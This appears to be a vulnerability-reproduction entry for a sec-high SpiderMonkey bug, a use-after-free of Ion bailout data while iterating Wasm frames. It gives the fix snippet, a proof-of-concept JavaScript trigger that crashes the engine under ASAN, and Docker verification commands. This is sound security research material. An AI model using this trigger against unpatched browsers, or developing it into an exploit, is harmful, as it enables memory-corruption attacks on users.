# Bugzilla 1902983

**Title:** Wasm bailout data use-after-free after iterating Wasm frames
**Severity:** sec-high (follow-up to bug 1900523)
**Component:** SpiderMonkey — Ion JIT — `js/src/jit/JSJitFrameIter.cpp`
**Fix commit:** `d5df70357db3d244669ed3147467e5b7ade0f51c` ("Bug 1902983 - Don't use bailout data after iterating Wasm frames. r=iain", Jan de Mooij, 2024-06-19)
**Vulnerable revision:** `d5df70357db3d244669ed3147467e5b7ade0f51c~1`

## Summary

Bug 1900523 had previously fixed bailout-data lifetime for the
`JSJitToWasm` frame type — used when execution enters Wasm via the JIT
entry trampoline. That fix was incomplete: when **Ion calls a Wasm
function directly**, the boundary frame is `FrameType::Exit`, not
`JSJitToWasm`. On that path `JSJitFrameIter` still consumed the
`BailoutInfo*` pointer that lived in stack memory belonging to a Wasm
frame. After the iterator advanced past the Wasm frames the memory
was reused, so the iterator dereferenced freed bailout data.

## Fix

```cpp
// js/src/jit/JSJitFrameIter.cpp — clear bailout pointer on both
// JSJitToWasm and Exit boundaries before iterating Wasm frames
if (current().type() == FrameType::JSJitToWasm ||
    current().type() == FrameType::Exit) {
  bailoutData_ = nullptr;     // memory is about to die with the Wasm frames
}
```

## Trigger (`poc.js`)

Reduced from `js/src/jit-test/tests/ion/bug1902983.js` (added in the
fix commit). Drives Ion → Wasm → JS recursion under aggressive GC zeal
so an Ion bailout fires while Wasm frames are on the stack.

```js
// |jit-test| --fast-warmup; --gc-zeal=21,100
let counter = 0;
function g() {
    counter++;
    const y = BigInt.asIntN(counter, -883678545n);
    const z = y >> y;
    BigInt.asUintN(2 ** counter, 883678545n);
    try { g(); } catch (e) { }
}
const binary = wasmTextToBinary(
  `(module (import "m" "f" (func $f)) (func (export "test") (call $f)))`);
const inst = new WebAssembly.Instance(
  new WebAssembly.Module(binary), { m: { f: g } });
for (let i = 0; i < 5; i++) inst.exports.test();
```

## Expected crash

ASAN heap/stack-use-after-free or SEGV inside `JSJitFrameIter` while
unwinding Wasm frames during a bailout — surfacing from
`js::jit::JitFrameIter::operator++` /
`js::jit::JSJitFrameIter::skipNonScriptedJSFrames`.

## Verification

```sh
docker build -t hwiwonlee/sm.x86_64:1902983 spidermonkey/1902983
bash spidermonkey/crash_check.sh 1902983
```

Expected: `CONFIMRED: ASAN_CRASH`.
